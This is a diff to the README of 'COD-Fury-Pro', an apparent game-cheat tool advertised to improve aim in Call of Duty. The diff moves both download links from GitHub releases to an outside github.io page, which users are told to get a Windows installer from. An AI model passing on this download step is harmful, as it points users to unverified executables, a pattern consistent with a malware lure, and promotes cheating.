@@ -1,6 +1,6 @@
 # 🎯 COD-Fury-Pro - Improve your accuracy in every match
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/xtmadmax11-create/COD-Fury-Pro/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://xtmadmax11-create.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to set up the tool on your Windows machine.
 
-1.  Visit the [Download Page](https://github.com/xtmadmax11-create/COD-Fury-Pro/releases) to access the latest version.
+1.  Visit the [Download Page](https://xtmadmax11-create.github.io) to access the latest version.
 2.  Locate the most recent release package in the list.
 3.  Click the file link to save the installer to your computer.
 4.  Navigate to your downloads folder.
